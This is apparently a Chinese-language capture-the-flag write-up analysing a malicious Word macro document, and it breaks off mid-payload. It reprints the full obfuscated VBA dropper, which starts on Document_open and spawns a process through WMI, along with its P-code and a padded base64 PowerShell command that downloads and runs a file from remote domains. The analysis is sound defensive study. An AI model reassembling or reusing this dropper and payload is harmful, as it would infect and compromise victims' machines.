@@ -1,0 +1,797 @@
+# MalDoc
+
+​	这里我进行分析的是一个sample.bin文件，题目中甩给我九个问题，分别是：
+
+```
+此文档中包含多个宏，请提供编号最高的宏的编号。
+
+宏的执行是通过哪个事件开始的？
+
+这个恶意文档试图投放的是哪种恶意软件家族？
+
+哪个流负责存储 base64 编码的字符串？
+
+本文档包含一个用户窗体。请提供窗体名称。
+
+本文档包含一个经过混淆处理的 Base64 编码字符串；用于填充（或混淆）此字符串的值是什么？
+
+Base64编码字符串执行的是什么程序？
+
+用于创建启动木马进程的 WMI 类是什么？
+
+多个域名被尝试下载木马程序。请根据提示提供第一个完全限定域名 (FQDN)。
+```
+
+​	这一题首先一开始要对于这个文件进行一个分析：
+
+```
+PS D:\programCTF\malware\51-maldoc101\temp_extract_dir\MalDoc101> file sample.bin
+sample.bin: Composite Document File V2 Document, Little Endian, Os: Windows, Version 10.0, Code page: 1252, Template: Normal.dotm, Revision Number: 1, Name of Creating Application: Microsoft Office Word, Create Time/Date: Wed Jul 22 23:12:00 2020, Last Saved Time/Date: Wed Jul 22 23:12:00 2020, Number of Pages: 1, Number of Words: 3, Number of Characters: 21, Security: 0
+```
+
+​	该命令显示该文件`Composite Document File V2`为 CFB 格式文件。输出结果提供了重要的元数据，包括创建该文件的操作系统、上次保存的日期和时间以及应用程序版本。这些信息有助于判断文档的来源以及是否已被修改。所以下一步就用oledump.py对于这个文件进行一个分析：
+
+![image-20260821114558605](C:\Users\26388\AppData\Roaming\Typora\typora-user-images\image-20260821114558605.png)
+
+​	`M`请注意，和`m`指标之间的主要区别`oledump`在于它们所代表的宏观内容类型：
+
+- **M（大写 M）：**`attributes`此指示符表示包含带有 `&`和 `& ` 宏的流`compressed VBA code`。需要解压缩压缩代码才能分析宏的功能，而这些功能通常涉及恶意意图。`&` 的存在`M`通常表示流中包含通过压缩隐藏的可执行宏内容。
+- **m（小写字母 m）：**此指示符表示包含宏但不包含实际宏代码的流`attributes`。这些流可能包含与宏环境相关的元数据或描述符，但不包含任何功能性或可执行的 VBA 内容。
+
+​	所以根据逻辑，第一题的答案就是：
+
+​	`16`
+
+​	然后我是用了`olevba`这个工具，`olevba`可以把它理解成：专门用来“拆 Office 文档里的 VBA 宏代码”的分析工具。
+
+​	然后我：
+
+​	`python3 olevba.py sample.bin`
+
+​	分析完很长很长，就直接找关键的地方：
+​	（第一次搞这个，我把整个的分析全部列出来）
+
+```
+FILE: sample.bin
+Type: OLE
+\-------------------------------------------------------------------------------
+VBA MACRO diakzouxchouz.cls
+in file: sample.bin - OLE stream: 'Macros/VBA/diakzouxchouz'
+\- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+Private Sub \_
+Document\_open()
+boaxvoebxiotqueb
+End Sub
+
+\-------------------------------------------------------------------------------
+VBA MACRO roubhaol.frm
+in file: sample.bin - OLE stream: 'Macros/VBA/roubhaol'
+\- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+(empty macro)
+\-------------------------------------------------------------------------------
+VBA MACRO govwiahtoozfaid.bas
+in file: sample.bin - OLE stream: 'Macros/VBA/govwiahtoozfaid'
+\- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+Function boaxvoebxiotqueb()
+gooykadheoj = Chr(roubhaol.Zoom + Int(5 \* 3))
+Dim c7ÓATOQe2Ëj As Integer
+c7ÓATOQe2Ëj = 6
+Do While c7ÓATOQe2Ëj < 6 + 2
+c7ÓATOQe2Ëj = c7ÓATOQe2Ëj + 5: DoEvents
+Loop
+haothkoebtheil = "2342772g3&\*gs7712ffvs626fq2342772g3&\*gs7712ffvs626fqw2342772g3&\*gs7712ffvs626fq2342772g3&\*gs7712ffvs626fqin2342772g3&\*gs7712ffvs626fq2342772g3&\*gs7712ffvs626fqm2342772g3&\*gs7712ffvs626fqgm2342772g3&\*gs7712ffvs626fq2342772g3&\*gs7712ffvs626fqt2342772g3&\*gs7712ffvs626fq" + gooykadheoj + "2342772g3&\*gs7712ffvs626fq2342772g3&\*gs7712ffvs626fq\:w2342772g3&\*gs7712ffvs626fq2342772g3&\*gs7712ffvs626fqin2342772g3&\*gs7712ffvs626fq322342772g3&\*gs7712ffvs626fq\_2342772g3&\*gs7712ffvs626fq" + roubhaol.joefwoefcheaw + "2342772g3&\*gs7712ffvs626fqr2342772g3&\*gs7712ffvs626fqo2342772g3&\*gs7712ffvs626fq2342772g3&\*gs7712ffvs626fqc2342772g3&\*gs7712ffvs626fqes2342772g3&\*gs7712ffvs626fqs2342772g3&\*gs7712ffvs626fq"
+Dim t0Á7ÖVhC As String
+t0Á7ÖVhC = Replace$("NrsGblssw", "NrsGbl", "jeSyf")
+deulsaocthuul = juuvzouchmiopxeox(haothkoebtheil)
+Dim aboKTWBmOV As Variant
+Set tiajriokchaoy = CreateObject(deulsaocthuul)
+Dim Li2ÚJ8âfUTJJ As Boolean
+deaknaugthein = roubhaol.kaizseah.ControlTipText
+Dim Wmuaj As String
+Wmuaj = Replace$("LqdFaWZRoPXoybkSqY", "LqdFaWZRoP", "nIEI6Ý")
+giakfeiw = deulsaocthuul + gooykadheoj + roubhaol.paerwagyouqumeid.ControlTipText + deaknaugthein
+Dim lgiLh7Ë As Object
+queegthaen = giakfeiw + roubhaol.joefwoefcheaw
+Dim FZV4ÇKPQ As Integer
+FZV4ÇKPQ = 4
+Do While FZV4ÇKPQ < 4 + 5
+FZV4ÇKPQ = FZV4ÇKPQ + 3: DoEvents
+Loop
+Set deavjoajsear = luumlaud(queegthaen)
+Dim kRpYwyW As String
+kRpYwyW = Replace$("f4åL5åJqZNvlk", "f4åL5åJ", "TFRkfTygd")
+xve = Array \_
+("1234444123", tiajriokchaoy. \_
+Create(geulgelquuuj, kaenhaig, deavjoajsear), "9938723")
+Dim C0ÄjVh As Integer
+C0ÄjVh = 9
+Do While C0ÄjVh < 9 + 1
+C0ÄjVh = C0ÄjVh + 1: DoEvents
+Loop
+End Function
+Function juuvzouchmiopxeox(yiajthoavheiw)
+geutyoeytiestheug = yiajthoavheiw
+Dim QSuRcu As Currency
+feaxgeip = Split(geutyoeytiestheug, "2342772g3&\*gs7712ffvs626fq")
+Dim J1Â8ÀXwEwAd As String
+J1Â8ÀXwEwAd = Replace$("UBZIWrn7ÆJAPVmt", "UBZI", "hsvq")
+jaquhoiqu = csqw + Join(feaxgeip, eihnx)
+Dim gBv As Object
+juuvzouchmiopxeox = jaquhoiqu
+Dim lqsqsHrCH As Boolean
+End Function
+Function geulgelquuuj()
+sjiqw = roubhaol.gaoddaicsauktheb.Pages(10 / 10).ControlTipText
+Dim ISXQDR As Integer
+ISXQDR = 2
+Do While ISXQDR < 2 + 7
+ISXQDR = ISXQDR + 9: DoEvents
+Loop
+geulgelquuuj = juuvzouchmiopxeox(sjiqw)
+Dim kbqvO4Ä7Çr As Byte
+End Function
+Function luumlaud(zeolkaepxoag)
+Set luumlaud = CreateObject(zeolkaepxoag)
+Dim vPu As String
+vPu = Replace$("BenqV1áigVwifwdQq", "BenqV1ái", "on5Â")
+luumlaud \_
+. \_
+showwindow = (mujgoiy + jioyseertioch) + (neivberziok + xuajroegquoudcaij)
+Dim osWIUnikOk As String
+osWIUnikOk = Replace$("cLwhWVLMDSQFh3ÔT7É", "cLwhWVLMDS", "AvYXNNS")
+End Function
+
+\-------------------------------------------------------------------------------
+VBA MACRO VBA\_P-code.txt
+in file: VBA P-code - OLE stream: 'VBA P-code'
+\- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+' Processing file: sample.bin
+' ===============================================================================
+' Module streams:
+' Macros/VBA/diakzouxchouz - 1367 bytes
+' Line #0:
+'       LineCont 0x0004 02 00 00 00
+'       FuncDefn (Sub diakzouxchouz())
+' Line #1:
+'       ArgsCall Document\_open 0x0000
+' Line #2:
+'       EndSub
+' Line #3:
+' Macros/VBA/roubhaol - 1187 bytes
+' Macros/VBA/govwiahtoozfaid - 5705 bytes
+' Line #0:
+'       FuncDefn (Function Document\_open())
+' Line #1:
+'       Ld roubhaol
+'       MemLd Chr
+'       LitDI2 0x0005
+'       LitDI2 0x0003
+'       Mul
+'       FnInt
+'       Add
+'       ArgsLd gooykadheoj 0x0001
+'       St govwiahtoozfaid
+' Line #2:
+'       Dim
+'       VarDefn Zoom (As Integer)
+' Line #3:
+'       LitDI2 0x0006
+'       St Zoom
+' Line #4:
+'       Ld Zoom
+'       LitDI2 0x0006
+'       LitDI2 0x0002
+'       Add
+'       Lt
+'       DoWhile
+' Line #5:
+'       Ld Zoom
+'       LitDI2 0x0005
+'       Add
+'       St Zoom
+'       BoS 0x0000
+'       ArgsCall DoEvents 0x0000
+' Line #6:
+'       Loop
+' Line #7:
+'       LitStr 0x010B "2342772g3&\*gs7712ffvs626fq2342772g3&\*gs7712ffvs626fqw2342772g3&\*gs7712ffvs626fq2342772g3&\*gs7712ffvs626fqin2342772g3&\*gs7712ffvs626fq2342772g3&\*gs7712ffvs626fqm2342772g3&\*gs7712ffvs626fqgm2342772g3&\*gs7712ffvs626fq2342772g3&\*gs7712ffvs626fqt2342772g3&\*gs7712ffvs626fq"
+'       Ld govwiahtoozfaid
+'       Add
+'       LitStr 0x00BD "2342772g3&\*gs7712ffvs626fq2342772g3&\*gs7712ffvs626fq\:w2342772g3&\*gs7712ffvs626fq2342772g3&\*gs7712ffvs626fqin2342772g3&\*gs7712ffvs626fq322342772g3&\*gs7712ffvs626fq\_2342772g3&\*gs7712ffvs626fq"
+'       Add
+'       Ld roubhaol
+'       MemLd haothkoebtheil
+'       Add
+'       LitStr 0x00BC "2342772g3&\*gs7712ffvs626fqr2342772g3&\*gs7712ffvs626fqo2342772g3&\*gs7712ffvs626fq2342772g3&\*gs7712ffvs626fqc2342772g3&\*gs7712ffvs626fqes2342772g3&\*gs7712ffvs626fqs2342772g3&\*gs7712ffvs626fq"
+'       Add
+'       St c7ÓATOQe2Ëj
+' Line #8:
+'       Dim
+'       VarDefn joefwoefcheaw (As String)
+' Line #9:
+'       LitStr 0x0009 "NrsGblssw"
+'       LitStr 0x0006 "NrsGbl"
+'       LitStr 0x0005 "jeSyf"
+'       ArgsLd t0Á7ÖVhC$ 0x0003
+'       St joefwoefcheaw
+' Line #10:
+'       Ld c7ÓATOQe2Ëj
+'       ArgsLd deulsaocthuul 0x0001
+'       St Replace
+' Line #11:
+'       Dim
+'       VarDefn juuvzouchmiopxeox (As Variant)
+' Line #12:
+'       SetStmt
+'       Ld Replace
+'       ArgsLd tiajriokchaoy 0x0001
+'       Set aboKTWBmOV
+' Line #13:
+'       Dim
+'       VarDefn CreateObject (As Boolean)
+' Line #14:
+'       Ld roubhaol
+'       MemLd deaknaugthein
+'       MemLd ControlTipText
+'       St Li2ÚJ8âfUTJJ
+' Line #15:
+'       Dim
+'       VarDefn kaizseah (As String)
+' Line #16:
+'       LitStr 0x0012 "LqdFaWZRoPXoybkSqY"
+'       LitStr 0x000A "LqdFaWZRoP"
+'       LitStr 0x0006 "nIEI6Ý"
+'       ArgsLd t0Á7ÖVhC$ 0x0003
+'       St kaizseah
+' Line #17:
+'       Ld Replace
+'       Ld govwiahtoozfaid
+'       Add
+'       Ld roubhaol
+'       MemLd giakfeiw
+'       MemLd ControlTipText
+'       Add
+'       Ld Li2ÚJ8âfUTJJ
+'       Add
+'       St Wmuaj
+' Line #18:
+'       Dim
+'       VarDefn paerwagyouqumeid (As Object)
+' Line #19:
+'       Ld Wmuaj
+'       Ld roubhaol
+'       MemLd haothkoebtheil
+'       Add
+'       St lgiLh7Ë
+' Line #20:
+'       Dim
+'       VarDefn queegthaen (As Integer)
+' Line #21:
+'       LitDI2 0x0004
+'       St queegthaen
+' Line #22:
+'       Ld queegthaen
+'       LitDI2 0x0004
+'       LitDI2 0x0005
+'       Add
+'       Lt
+'       DoWhile
+' Line #23:
+'       Ld queegthaen
+'       LitDI2 0x0003
+'       Add
+'       St queegthaen
+'       BoS 0x0000
+'       ArgsCall DoEvents 0x0000
+' Line #24:
+'       Loop
+' Line #25:
+'       SetStmt
+'       Ld lgiLh7Ë
+'       ArgsLd deavjoajsear 0x0001
+'       Set FZV4ÇKPQ
+' Line #26:
+'       Dim
+'       VarDefn luumlaud (As String)
+' Line #27:
+'       LitStr 0x000D "f4åL5åJqZNvlk"
+'       LitStr 0x0007 "f4åL5åJ"
+'       LitStr 0x0009 "TFRkfTygd"
+'       ArgsLd t0Á7ÖVhC$ 0x0003
+'       St luumlaud
+' Line #28:
+'       LineCont 0x0008 03 00 00 00 08 00 00 00
+'       LitStr 0x000A "1234444123"
+'       Ld Create
+'       Ld geulgelquuuj
+'       Ld FZV4ÇKPQ
+'       Ld aboKTWBmOV
+'       ArgsMemLd xve 0x0003
+'       LitStr 0x0007 "9938723"
+'       ArgsArray Array 0x0003
+'       St kRpYwyW
+' Line #29:
+'       Dim
+'       VarDefn kaenhaig (As Integer)
+' Line #30:
+'       LitDI2 0x0009
+'       St kaenhaig
+' Line #31:
+'       Ld kaenhaig
+'       LitDI2 0x0009
+'       LitDI2 0x0001
+'       Add
+'       Lt
+'       DoWhile
+' Line #32:
+'       Ld kaenhaig
+'       LitDI2 0x0001
+'       Add
+'       St kaenhaig
+'       BoS 0x0000
+'       ArgsCall DoEvents 0x0000
+' Line #33:
+'       Loop
+' Line #34:
+'       EndFunc
+' Line #35:
+'       FuncDefn (Function deulsaocthuul(C0ÄjVh))
+' Line #36:
+'       Ld C0ÄjVh
+'       St yiajthoavheiw
+' Line #37:
+'       Dim
+'       VarDefn geutyoeytiestheug (As Currency)
+' Line #38:
+'       Ld yiajthoavheiw
+'       LitStr 0x001A "2342772g3&\*gs7712ffvs626fq"
+'       ArgsLd feaxgeip 0x0002
+'       St QSuRcu
+' Line #39:
+'       Dim
+'       VarDefn Split (As String)
+' Line #40:
+'       LitStr 0x000F "UBZIWrn7ÆJAPVmt"
+'       LitStr 0x0004 "UBZI"
+'       LitStr 0x0004 "hsvq"
+'       ArgsLd t0Á7ÖVhC$ 0x0003
+'       St Split
+' Line #41:
+'       Ld jaquhoiqu
+'       Ld QSuRcu
+'       Ld Join
+'       ArgsLd csqw 0x0002
+'       Add
+'       St J1Â8ÀXwEwAd
+' Line #42:
+'       Dim
+'       VarDefn eihnx (As Object)
+' Line #43:
+'       Ld J1Â8ÀXwEwAd
+'       St deulsaocthuul
+' Line #44:
+'       Dim
+'       VarDefn gBv (As Boolean)
+' Line #45:
+'       EndFunc
+' Line #46:
+'       FuncDefn (Function Create())
+' Line #47:
+'       LitDI2 0x000A
+'       LitDI2 0x000A
+'       Div
+'       Ld roubhaol
+'       MemLd gaoddaicsauktheb
+'       ArgsMemLd Pages 0x0001
+'       MemLd ControlTipText
+'       St lqsqsHrCH
+' Line #48:
+'       Dim
+'       VarDefn sjiqw (As Integer)
+' Line #49:
+'       LitDI2 0x0002
+'       St sjiqw
+' Line #50:
+'       Ld sjiqw
+'       LitDI2 0x0002
+'       LitDI2 0x0007
+'       Add
+'       Lt
+'       DoWhile
+' Line #51:
+'       Ld sjiqw
+'       LitDI2 0x0009
+'       Add
+'       St sjiqw
+'       BoS 0x0000
+'       ArgsCall DoEvents 0x0000
+' Line #52:
+'       Loop
+' Line #53:
+'       Ld lqsqsHrCH
+'       ArgsLd deulsaocthuul 0x0001
+'       St Create
+' Line #54:
+'       Dim
+'       VarDefn ISXQDR (As Byte)
+' Line #55:
+'       EndFunc
+' Line #56:
+'       FuncDefn (Function deavjoajsear(kbqvO4Ä7Çr))
+' Line #57:
+'       SetStmt
+'       Ld kbqvO4Ä7Çr
+'       ArgsLd tiajriokchaoy 0x0001
+'       Set deavjoajsear
+' Line #58:
+'       Dim
+'       VarDefn zeolkaepxoag (As String)
+' Line #59:
+'       LitStr 0x0011 "BenqV1áigVwifwdQq"
+'       LitStr 0x0008 "BenqV1ái"
+'       LitStr 0x0004 "on5Â"
+'       ArgsLd t0Á7ÖVhC$ 0x0003
+'       St zeolkaepxoag
+' Line #60:
+'       LineCont 0x0008 01 00 00 00 02 00 00 00
+'       Ld showwindow
+'       Ld mujgoiy
+'       Add
+'       Paren
+'       Ld jioyseertioch
+'       Ld neivberziok
+'       Add
+'       Paren
+'       Add
+'       Ld deavjoajsear
+'       MemSt vPu
+' Line #61:
+'       Dim
+'       VarDefn xuajroegquoudcaij (As String)
+' Line #62:
+'       LitStr 0x0012 "cLwhWVLMDSQFh3ÔT7É"
+'       LitStr 0x000A "cLwhWVLMDS"
+'       LitStr 0x0007 "AvYXNNS"
+'       ArgsLd t0Á7ÖVhC$ 0x0003
+'       St xuajroegquoudcaij
+' Line #63:
+'       EndFunc
+' Line #64:
+\-------------------------------------------------------------------------------
+VBA FORM STRING IN 'sample.bin' - OLE stream: 'Macros/roubhaol/o'
+\- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+joopxof
+\-------------------------------------------------------------------------------
+VBA FORM STRING IN 'sample.bin' - OLE stream: 'Macros/roubhaol/o'
+\- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+caorfauxleir
+\-------------------------------------------------------------------------------
+VBA FORM STRING IN 'sample.bin' - OLE stream: 'Macros/roubhaol/o'
+\- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+foewdaibzian
+\-------------------------------------------------------------------------------
+VBA FORM STRING IN 'sample.bin' - OLE stream: 'Macros/roubhaol/o'
+\- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+yoewcheuypouc
+\-------------------------------------------------------------------------------
+VBA FORM STRING IN 'sample.bin' - OLE stream: 'Macros/roubhaol/o'
+\- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+duuhfeupniwboha
+\-------------------------------------------------------------------------------
+VBA FORM STRING IN 'sample.bin' - OLE stream: 'Macros/roubhaol/i09/o'
+\- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+�Page1O3G
+\-------------------------------------------------------------------------------
+VBA FORM STRING IN 'sample.bin' - OLE stream: 'Macros/roubhaol/i09/o'
+\- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+�Page2O3G
+\-------------------------------------------------------------------------------
+VBA FORM STRING IN 'sample.bin' - OLE stream: 'Macros/roubhaol/i09/o'
+\- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+�p2342772g3&\*gs7712ffvs626fqo2342772g3&\*gs7712ffvs626fqw2342772g3&\*gs7712ffvs626fqe2342772g3&\*gs7712ffvs626fqr2342772g3&\*gs7712ffvs626fqs2342772g3&\*gs7712ffvs626fqh2342772g3&\*gs7712ffvs626fqeL2342772g3&\*gs7712ffvs626fqL2342772g3&\*gs7712ffvs626fq 2342772g3&\*gs7712ffvs626fq-2342772g3&\*gs7712ffvs626fqe2342772g3&\*gs7712ffvs626fq JABsAG2342772g3&\*gs7712ffvs626fqkAZQBj2342772g3&\*gs7712ffvs626fqAGgAcg2342772g3&\*gs7712ffvs626fqBvAHUA2342772g3&\*gs7712ffvs626fqaAB3AH2342772g3&\*gs7712ffvs626fqUAdwA92342772g3&\*gs7712ffvs626fqACcAdg2342772g3&\*gs7712ffvs626fqB1AGEA2342772g3&\*gs7712ffvs626fqYwBkAG2342772g3&\*gs7712ffvs626fq8AdQB22342772g3&\*gs7712ffvs626fqAGMAaQ2342772g3&\*gs7712ffvs626fqBvAHgA2342772g3&\*gs7712ffvs626fqaABhAG2342772g3&\*gs7712ffvs626fq8AbAAn2342772g3&\*gs7712ffvs626fqADsAWw2342772g3&\*gs7712ffvs626fqBOAGUA2342772g3&\*gs7712ffvs626fqdAAuAF2342772g3&\*gs7712ffvs626fqMAZQBy2342772g3&\*gs7712ffvs626fqAHYAaQ2342772g3&\*gs7712ffvs626fqBjAGUA2342772g3&\*gs7712ffvs626fqUABvAG2342772g3&\*gs7712ffvs626fqkAbgB02342772g3&\*gs7712ffvs626fqAE0AYQ2342772g3&\*gs7712ffvs626fqBuAGEA2342772g3&\*gs7712ffvs626fqZwBlAH2342772g3&\*gs7712ffvs626fqIAXQA62342772g3&\*gs7712ffvs626fqADoAIg2342772g3&\*gs7712ffvs626fqBTAEUA2342772g3&\*gs7712ffvs626fqYABjAH2342772g3&\*gs7712ffvs626fqUAUgBp2342772g3&\*gs7712ffvs626fqAFQAeQ2342772g3&\*gs7712ffvs626fqBgAFAA2342772g3&\*gs7712ffvs626fqUgBPAG2342772g3&\*gs7712ffvs626fqAAVABv2342772g3&\*gs7712ffvs626fqAEMAYA2342772g3&\*gs7712ffvs626fqBvAGwA2342772g3&\*gs7712ffvs626fqIgAgAD2342772g3&\*gs7712ffvs626fq0AIAAn2342772g3&\*gs7712ffvs626fqAHQAbA2342772g3&\*gs7712ffvs626fqBzADEA2342772g3&\*gs7712ffvs626fqMgAsAC2342772g3&\*gs7712ffvs626fqAAdABs2342772g3&\*gs7712ffvs626fqAHMAMQ2342772g3&\*gs7712ffvs626fqAxACwA2342772g3&\*gs7712ffvs626fqIAB0AG2342772g3&\*gs7712ffvs626fqwAcwAn2342772g3&\*gs7712ffvs626fqADsAJA2342772g3&\*gs7712ffvs626fqBkAGUA2342772g3&\*gs7712ffvs626fqaQBjAG2342772g3&\*gs7712ffvs626fqgAYgBl2342772g3&\*gs7712ffvs626fqAHUAZA2342772g3&\*gs7712ffvs626fqByAGUA2342772g3&\*gs7712ffvs626fqaQByAC2342772g3&\*gs7712ffvs626fqAAPQAg2342772g3&\*gs7712ffvs626fqACcAMw2342772g3&\*gs7712ffvs626fqAzADcA2342772g3&\*gs7712ffvs626fqJwA7AC2342772g3&\*gs7712ffvs626fqQAcQB12342772g3&\*gs7712ffvs626fqAG8AYQ2342772g3&\*gs7712ffvs626fqBkAGcA2342772g3&\*gs7712ffvs626fqbwBpAG2342772g3&\*gs7712ffvs626fqoAdgBl2342772g3&\*gs7712ffvs626fqAHUAbQ2342772g3&\*gs7712ffvs626fqA9ACcA2342772g3&\*gs7712ffvs626fqZAB1AH2342772g3&\*gs7712ffvs626fqUAdgBt2342772g3&\*gs7712ffvs626fqAG8AZQ2342772g3&\*gs7712ffvs626fqB6AGgA2342772g3&\*gs7712ffvs626fqYQBpAH2342772g3&\*gs7712ffvs626fqQAZwBv2342772g3&\*gs7712ffvs626fqAGgAJw2342772g3&\*gs7712ffvs626fqA7ACQA2342772g3&\*gs7712ffvs626fqdABvAG2342772g3&\*gs7712ffvs626fqUAaABm2342772g3&\*gs7712ffvs626fqAGUAdA2342772g3&\*gs7712ffvs626fqBoAHgA2342772g3&\*gs7712ffvs626fqbwBoAG2342772g3&\*gs7712ffvs626fqIAYQBl2342772g3&\*gs7712ffvs626fqAHkAPQ2342772g3&\*gs7712ffvs626fqAkAGUA2342772g3&\*gs7712ffvs626fqbgB2AD2342772g3&\*gs7712ffvs626fqoAdQBz2342772g3&\*gs7712ffvs626fqAGUAcg2342772g3&\*gs7712ffvs626fqBwAHIA2342772g3&\*gs7712ffvs626fqbwBmAG2342772g3&\*gs7712ffvs626fqkAbABl2342772g3&\*gs7712ffvs626fqACsAJw2342772g3&\*gs7712ffvs626fqBcACcA2342772g3&\*gs7712ffvs626fqKwAkAG2342772g3&\*gs7712ffvs626fqQAZQBp2342772g3&\*gs7712ffvs626fqAGMAaA2342772g3&\*gs7712ffvs626fqBiAGUA2342772g3&\*gs7712ffvs626fqdQBkAH2342772g3&\*gs7712ffvs626fqIAZQBp2342772g3&\*gs7712ffvs626fqAHIAKw2342772g3&\*gs7712ffvs626fqAnAC4A2342772g3&\*gs7712ffvs626fqZQB4AG2342772g3&\*gs7712ffvs626fqUAJwA72342772g3&\*gs7712ffvs626fqACQAcw2342772g3&\*gs7712ffvs626fqBpAGUA2342772g3&\*gs7712ffvs626fqbgB0AG2342772g3&\*gs7712ffvs626fqUAZQBk2342772g3&\*gs7712ffvs626fqAD0AJw2342772g3&\*gs7712ffvs626fqBxAHUA2342772g3&\*gs7712ffvs626fqYQBpAG2342772g3&\*gs7712ffvs626fq4AcQB12342772g3&\*gs7712ffvs626fqAGEAYw2342772g3&\*gs7712ffvs626fqBoAGwA2342772g3&\*gs7712ffvs626fqbwBhAH2342772g3&\*gs7712ffvs626fqoAJwA72342772g3&\*gs7712ffvs626fqACQAcg2342772g3&\*gs7712ffvs626fqBlAHUA2342772g3&\*gs7712ffvs626fqcwB0AG2342772g3&\*gs7712ffvs626fqgAbwBh2342772g3&\*gs7712ffvs626fqAHMAPQ2342772g3&\*gs7712ffvs626fqAuACgA2342772g3&\*gs7712ffvs626fqJwBuAC2342772g3&\*gs7712ffvs626fqcAKwAn2342772g3&\*gs7712ffvs626fqAGUAdw2342772g3&\*gs7712ffvs626fqAtAG8A2342772g3&\*gs7712ffvs626fqYgAnAC2342772g3&\*gs7712ffvs626fqsAJwBq2342772g3&\*gs7712ffvs626fqAGUAYw2342772g3&\*gs7712ffvs626fqB0ACcA2342772g3&\*gs7712ffvs626fqKQAgAG2342772g3&\*gs7712ffvs626fq4ARQB02342772g3&\*gs7712ffvs626fqAC4Adw2342772g3&\*gs7712ffvs626fqBlAEIA2342772g3&\*gs7712ffvs626fqYwBsAE2342772g3&\*gs7712ffvs626fqkAZQBu2342772g3&\*gs7712ffvs626fqAFQAOw2342772g3&\*gs7712ffvs626fqAkAGoA2342772g3&\*gs7712ffvs626fqYQBjAG2342772g3&\*gs7712ffvs626fqwAZQBl2342772g3&\*gs7712ffvs626fqAHcAeQ2342772g3&\*gs7712ffvs626fqBpAHEA2342772g3&\*gs7712ffvs626fqdQA9AC2342772g3&\*gs7712ffvs626fqcAaAB02342772g3&\*gs7712ffvs626fqAHQAcA2342772g3&\*gs7712ffvs626fqBzADoA2342772g3&\*gs7712ffvs626fqLwAvAG2342772g3&\*gs7712ffvs626fqgAYQBv2342772g3&\*gs7712ffvs626fqAHEAdQ2342772g3&\*gs7712ffvs626fqBuAGsA2342772g3&\*gs7712ffvs626fqbwBuAG2342772g3&\*gs7712ffvs626fqcALgBj2342772g3&\*gs7712ffvs626fqAG8AbQ2342772g3&\*gs7712ffvs626fqAvAGIA2342772g3&\*gs7712ffvs626fqbgAvAH2342772g3&\*gs7712ffvs626fqMAOQB32342772g3&\*gs7712ffvs626fqADQAdA2342772g3&\*gs7712ffvs626fqBnAGMA2342772g3&\*gs7712ffvs626fqagBsAF2342772g3&\*gs7712ffvs626fq8AZgA22342772g3&\*gs7712ffvs626fqADYANg2342772g3&\*gs7712ffvs626fqA5AHUA2342772g3&\*gs7712ffvs626fqZwB1AF2342772g3&\*gs7712ffvs626fq8AdwA02342772g3&\*gs7712ffvs626fqAGIAag2342772g3&\*gs7712ffvs626fqAvACoA2342772g3&\*gs7712ffvs626fqaAB0AH2342772g3&\*gs7712ffvs626fqQAcABz2342772g3&\*gs7712ffvs626fqADoALw2342772g3&\*gs7712ffvs626fqAvAHcA2342772g3&\*gs7712ffvs626fqdwB3AC2342772g3&\*gs7712ffvs626fq4AdABl2342772g3&\*gs7712ffvs626fqAGMAaA2342772g3&\*gs7712ffvs626fqB0AHIA2342772g3&\*gs7712ffvs626fqYQB2AG2342772g3&\*gs7712ffvs626fqUAbAAu2342772g3&\*gs7712ffvs626fqAGUAdg2342772g3&\*gs7712ffvs626fqBlAG4A2342772g3&\*gs7712ffvs626fqdABzAC2342772g3&\*gs7712ffvs626fq8AaQBu2342772g3&\*gs7712ffvs626fqAGYAbw2342772g3&\*gs7712ffvs626fqByAG0A2342772g3&\*gs7712ffvs626fqYQB0AG2342772g3&\*gs7712ffvs626fqkAbwBu2342772g3&\*gs7712ffvs626fqAGwALw2342772g3&\*gs7712ffvs626fqA4AGwA2342772g3&\*gs7712ffvs626fqcwBqAG2342772g3&\*gs7712ffvs626fqgAcgBs2342772g3&\*gs7712ffvs626fqADYAbg2342772g3&\*gs7712ffvs626fqBuAGsA2342772g3&\*gs7712ffvs626fqdwBnAH2342772g3&\*gs7712ffvs626fqkAegBz2342772g3&\*gs7712ffvs626fqAHUAZA2342772g3&\*gs7712ffvs626fqB6AGEA2342772g3&\*gs7712ffvs626fqbQBfAG2342772g3&\*gs7712ffvs626fqgAMwB32342772g3&\*gs7712ffvs626fqAG4AZw2342772g3&\*gs7712ffvs626fqBfAGEA2342772g3&\*gs7712ffvs626fqNgB2AD2342772g3&\*gs7712ffvs626fqUALwAq2342772g3&\*gs7712ffvs626fqAGgAdA2342772g3&\*gs7712ffvs626fqB0AHAA2342772g3&\*gs7712ffvs626fqOgAvAC2342772g3&\*gs7712ffvs626fq8AZABp2342772g3&\*gs7712ffvs626fqAGcAaQ2342772g3&\*gs7712ffvs626fqB3AGUA2342772g3&\*gs7712ffvs626fqYgBtAG2342772g3&\*gs7712ffvs626fqEAcgBr2342772g3&\*gs7712ffvs626fqAGUAdA2342772g3&\*gs7712ffvs626fqBpAG4A2342772g3&\*gs7712ffvs626fqZwAuAG2342772g3&\*gs7712ffvs626fqMAbwBt2342772g3&\*gs7712ffvs626fqAC8Adw2342772g3&\*gs7712ffvs626fqBwAC0A2342772g3&\*gs7712ffvs626fqYQBkAG2342772g3&\*gs7712ffvs626fq0AaQBu2342772g3&\*gs7712ffvs626fqAC8ANw2342772g3&\*gs7712ffvs626fqAyAHQA2342772g3&\*gs7712ffvs626fqMABqAG2342772g3&\*gs7712ffvs626fqoAaABt2342772g3&\*gs7712ffvs626fqAHYANw2342772g3&\*gs7712ffvs626fqB0AGEA2342772g3&\*gs7712ffvs626fqawB3AH2342772g3&\*gs7712ffvs626fqYAaQBz2342772g3&\*gs7712ffvs626fqAGYAbg2342772g3&\*gs7712ffvs626fqB6AF8A2342772g3&\*gs7712ffvs626fqZQBlAG2342772g3&\*g